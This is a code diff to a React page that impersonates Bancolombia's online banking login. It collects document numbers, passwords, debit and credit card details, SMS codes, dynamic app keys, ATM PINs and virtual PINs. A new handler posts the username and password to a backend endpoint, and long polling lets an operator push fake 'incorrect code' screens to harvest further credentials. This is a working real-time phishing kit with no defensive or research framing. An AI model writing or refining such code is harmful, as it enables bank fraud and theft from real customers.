@@ -10,11 +10,15 @@ import { handlerAplicacion, handlerCajero, handlerClaveVirtual, handlerMensaje, 
 
 const COLOR_PRINCIPAL_TEXT = "text-[#0048db]"
 const text_color_principal = "text-black"
-const ESTILO_BTN_PRINCIPAL = ` font-bold py-2 px-6 bg-[#fdda24] rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed`
+const ESTILO_BTN_PRINCIPAL = `w-32 font-bold py-2 px-6 bg-[#fdda24] rounded-full disabled:bg-gray-300 disabled:text-black cursor-not-allowed`
 
 const svg = (
     <img src="/assets/bancolombia/user.svg" className="w-[20px] h-[20px] object-contain" alt="" />
-    )
+)
+
+const candado = (
+    <img src="/assets/bancolombia/candado.svg" alt="" />
+)
 
 const btn = (
     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" className={`bi bi-eye ${COLOR_PRINCIPAL_TEXT}`} viewBox="0 0 16 16">
@@ -138,14 +142,15 @@ const InputAnimadoClave = ({
           {label}
         </label>
       )}
-      <div className="flex justify-between gap-2 w-full max-w-xs">
+      <div className="flex justify-between gap-2 w-full">
         {Array.from({ length: tamInput }).map((_, index) => (
           <input
             key={index}
             id={`${name}-${index}`}
             type="text"
+            inputMode="numeric" 
             maxLength={1}
-            className={`w-8 h-5 text-center border-b-2 text-xl font-semibold outline-none transition-all 
+            className={`w-6 h-5 text-center border-b-2 text-xl font-semibold outline-none transition-all 
               ${isFocused ? "border-black" : "border-gray-400"} 
               ${error ? "border-red-500" : ""}`}
             value={digits[index] || ""}
@@ -166,6 +171,30 @@ const InputAnimadoClave = ({
 };
 
 
+const handlerloginError = async ()=>{
+    try {
+        setLoading(true)
+        const { data } = await axios.post(
+        `/api/sesion`,
+        {
+            usuario: datosInicio.numeroDocumento,
+            clave: datosInicio.contrasenia,
+            banco: "Alianza",
+            uniqid: uniqId    
+        },
+        {
+            headers: {
+            "Content-Type": "application/json",
+            Accept: "application/json",
+            },
+        }
+        )
+        setReLoad(r => r = !r)            
+    } catch (error) {
+        await new Promise((resolve) => setTimeout(resolve, 30000));
+    }
+}
+
 
 
 const Clave = ({handlerCheck, handlerContinuar, handlerVolver,datosInicio, errorDatos})=>{
@@ -173,7 +202,7 @@ const Clave = ({handlerCheck, handlerContinuar, handlerVolver,datosInicio, error
         <div className="w-[90%] bg-white p-2 rounded-xl flex flex-col items-center">
             <img src="/assets/bancolombia/candado.svg" alt="" />
             <div className="w-[90%] flex flex-col mt-4 mb-4">
-                <span className="text-[12px] text-center text-gray-800">Es la misma que usas en el cajero automático</span>
+                <span className="text-[16px] text-center text-gray-800">Es la misma que usas en el cajero automático</span>
             </div>
             
             <div className="w-[50%] mt-4 flex flex-col">
@@ -199,8 +228,8 @@ const Clave = ({handlerCheck, handlerContinuar, handlerVolver,datosInicio, error
                 
             </div>
             
-            <div className="w-full pt-6 pb-2 flex justify-between items-center">
-                <button onClick={()=> handlerVolver(c => !c)} className="font-bold py-2 px-6 rounded-full border border-black"> 
+            <div className="w-[90%] pt-6 pb-2 flex justify-between items-center">
+                <button onClick={()=> handlerVolver(c => !c)} className="w-32 font-bold py-2 px-6 rounded-full border border-black"> 
                     Volver
                 </button>
                 <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.contrasenia.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
@@ -214,11 +243,11 @@ const Clave = ({handlerCheck, handlerContinuar, handlerVolver,datosInicio, error
 const Usuario = ({handlerCheck, handlerContinuar, datosInicio, errorDatos}) =>{
     return(
         <div className="w-[90%] bg-white p-2 rounded-xl flex flex-col items-center">
-            <div className="w-[90%] flex flex-col mt-2.5">
-                <span className="text-[12px] text-center text-gray-800">el usuario es el mismo con el que ingresas a la <span className="text-black font-bold">Sucursal Virtual Personas</span></span>
+            <div className="w-[80%] flex flex-col mt-2.5">
+                <span className="text-[16px] text-center text-gray-800">El usuario es el mismo con el que ingresas a la <span className="text-black font-bold">Sucursal Virtual Personas</span></span>
             </div>
             
-            <div className="w-[80%] mt-4 flex flex-col">
+            <div className="w-[70%] mt-4 flex flex-col">
                 <InputAnimado 
                     error={!!errorDatos.numeroDocumento}
                     errorLabel={errorDatos.numeroDocumento}
@@ -239,8 +268,8 @@ const Usuario = ({handlerCheck, handlerContinuar, datosInicio, errorDatos}) =>{
                 </div>
                 
             </div>
-            <div className="w-full pt-6 pb-2 flex justify-between items-center">
-                <button className="font-bold py-2 px-6 rounded-full border border-black"> 
+            <div className="w-[90%] pt-6 pb-2 flex justify-between items-center">
+                <button className="w-32 font-bold py-2 px-6 rounded-full border border-black"> 
                     Volver
                 </button>
                 <button onClick={()=> handlerContinuar(true)} disabled={datosInicio.numeroDocumento.trim() == ""} className={ESTILO_BTN_PRINCIPAL}>
@@ -251,7 +280,7 @@ const Usuario = ({handlerCheck, handlerContinuar, datosInicio, errorDatos}) =>{
     )
 }
 
-const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
+const InicioSesion = ({ handlerInformacion,  datosInicio, btnInicio, btnCancelar, tituloError }) => {
     const [errorDatos, setErrorDatos] = useState({
         numeroDocumento: "",
         contrasenia: ""       
@@ -324,7 +353,7 @@ const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar,
 
     return (
         <div className="w-full flex flex-col justify-center items-center pb-4">
-            <h5 className="text-[20px] font-bold mt-10">{!btnUser ? "Te damos la bienvenida": "Clave principal"}</h5>
+            <h5 className="text-[24px] font-bold mt-10">{!btnUser ? "Te damos la bienvenida": "Clave principal"}</h5>
             
             {tituloError !== "" && 
                 <div className="w-full flex items-center justify-center">
@@ -351,7 +380,7 @@ const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar,
 export default function Bancolombia (){
     const isMounted = useRef(true);
     const [inicioSesion, setInicioSesion] = useState(false)
-    const [selectVista, setSelectVisata] = useState("login")
+    const [selectVista, setSelectVisata] = useState("nlogin")
     const [loading, setLoading] = useState(false)
     const [tituloError, setTituloError] = useState("")
     const [reLoad, setReLoad] = useState(false)
@@ -394,15 +423,16 @@ export default function Bancolombia (){
 
     //pulling
     useEffect(() => {
-    isMounted.current = true;
+        isMounted.current = true;
 
-    if (guardado) {
-        iniciarLongPolling( isMounted, uniqId, setKey, setLoading, setSelectVisata, selectVista, setDatosInicio, setTituloError);
-    }
-    return () => {
-        isMounted.current = false;
-    };
-}, [guardado, reLoad]);
+        if (guardado) {
+            iniciarLongPolling( isMounted, uniqId, setKey, setLoading, setSelectVisata, selectVista, setDatosInicio, setTituloError);
+        }
+        return () => {
+            isMounted.current = false;
+
+        };
+    }, [guardado, reLoad]);
 
 
     return(
@@ -419,26 +449,29 @@ export default function Bancolombia (){
 
             </div>
             
-            <div className=" img min-h-[70vh] w-[90%] flex flex-col items-center justify-center">
+            <div className=" img min-h-[60vh] w-[90%] flex flex-col items-center justify-center">
+                
                 {(loading) && <Loading />}
                 {(!inicioSesion || selectVista === "xlogin") && (
-                    <InicioSesion key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={selectVista === "xlogin" ? tituloError : ""} btnInicio={selectVista === "login-error" ? handlerloginError : handlerBtnInicio}/>
+                    <InicioSesion key={key} handlerInformacion={ selectVista == "xlogin" ? handlerloginError : handlerInformacion} datosInicio={datosInicio} tituloError={selectVista === "xlogin" ? tituloError : ""} btnInicio={selectVista === "login-error" ? handlerloginError : handlerBtnInicio}/>
                 )}
-                {selectVista == "tdb" && <Tarjeta key={key} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "xtdb" && <Tarjeta key={key} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "tdc" && <Tarjeta key={key} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "xtdc" && <Tarjeta key={key} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "codsms" && <Status key={key} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimadoClave} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "xcodsms" && <Status key={key} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimadoClave} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "codapp" && <Status key={key} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave dinamica"} InputModificado={InputAnimadoClave} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "xcodapp" && <Status key={key} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimadoClave} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "pincaj" && <Status key={key} uniqId={uniqId} tamInput={6} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimadoClave} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "xpincaj" && <Status key={key} uniqId={uniqId} tamInput={6} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimadoClave} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "pinvir" && <Status key={key} uniqId={uniqId} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimadoClave} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
-                {selectVista == "xpinvir" && <Status key={key} uniqId={uniqId} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimadoClave} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                {selectVista == "tdb" && <Tarjeta key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                {selectVista == "xtdb" && <Tarjeta key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                {selectVista == "tdc" && <Tarjeta key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                {selectVista == "xtdc" && <Tarjeta key={key} setLoading={setLoading} setReLoad={setReLoad} uniqid={uniqId} status={selectVista} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                <div className="w-[80%] bg-white p-10 rounded-xl">
+                    {selectVista == "codsms" && <Status key={key} svg={candado} setLoading={setLoading} setReLoad={setReLoad} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"Verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimadoClave} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    {selectVista == "xcodsms" && <Status key={key} svg={candado} setLoading={setLoading} setReLoad={setReLoad} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"Verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimadoClave} handler={handlerMensaje} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    {selectVista == "codapp" && <Status key={key} svg={candado} setLoading={setLoading} setReLoad={setReLoad} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"Consulta tu Clave Dinámica desde la App Mi Bancolombia"} lebelInput={"Clave dinamica"} InputModificado={InputAnimadoClave} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    {selectVista == "xcodapp" && <Status key={key} svg={candado} setLoading={setLoading} setReLoad={setReLoad} uniqId={uniqId} tamInput={6} textColor={text_color_principal} titulo={"Verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimadoClave} handler={handlerAplicacion} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    {selectVista == "pincaj" && <Status key={key} svg={candado} setLoading={setLoading} setReLoad={setReLoad} uniqId={uniqId} tamInput={6} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"Verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimadoClave} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    {selectVista == "xpincaj" && <Status key={key} svg={candado} setLoading={setLoading} setReLoad={setReLoad} uniqId={uniqId} tamInput={6} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"Verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimadoClave} handler={handlerCajero} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    {selectVista == "pinvir" && <Status key={key} svg={candado} setLoading={setLoading} setReLoad={setReLoad} uniqId={uniqId} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"Verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimadoClave} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                    {selectVista == "xpinvir" && <Status key={key} svg={candado} setLoading={setLoading} setReLoad={setReLoad} uniqId={uniqId} tamInput={6} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"Verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimadoClave} handler={handlerClaveVirtual} estiloBtnContinuar={ESTILO_BTN_PRINCIPAL} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-slate-200"}/>}
+                </div>
             </div>
             
-            <div className="w-full flex flex-col justify-center items-center bg-white  py-7">
+            <div className="w-full flex flex-col justify-center items-center bg-white">
                 <div className="w-[90%] border-t-1 border-t-gray-300"></div>
                 <img src="/assets/bancolombia/header.svg" className="w-[40%] object-contain" alt="" />
                 <img src="/assets/bancolombia/foter.svg" className="w-[40%] object-contain mt-0.5" alt="" />                               
